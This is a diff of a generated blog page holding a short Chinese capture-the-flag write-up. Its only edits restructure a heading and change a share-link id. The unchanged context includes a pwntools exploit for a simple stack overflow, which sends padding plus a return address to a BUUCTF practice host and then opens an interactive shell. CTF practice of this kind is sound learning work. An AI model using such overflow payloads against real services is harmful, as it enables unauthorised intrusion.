@@ -77,9 +77,9 @@
       
 
       
-        <a id="more"></a>
+        <h3 id="1-测试nc"><a href="#1-测试nc" class="headerlink" title="1.测试nc"></a>1.测试nc</h3><a id="more"></a>
 
-<h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>nc 出结果</p>
+<p>nc 出结果</p>
 <h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p>简单的栈溢出</p>
 <p>exp：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"><span class="comment">#p = process("./pwn1")</span></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">28852</span>)</span><br><span class="line">p.recvuntil(<span class="string">"please input"</span>)</span><br><span class="line">payload = <span class="string">"a"</span> * (<span class="number">0xf</span> + <span class="number">8</span>)+ p64(<span class="number">0x401186</span>)</span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
@@ -205,7 +205,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/02/13/buuctf/" data-id="ck6kf65q8000a6wlu0pt35d8k"
+      <a data-url="http://yoursite.com/2020/02/13/buuctf/" data-id="ck6kf9nqi0004eglu4lqrfhrr"
          class="article-share-link">Share</a>
       
     </footer>
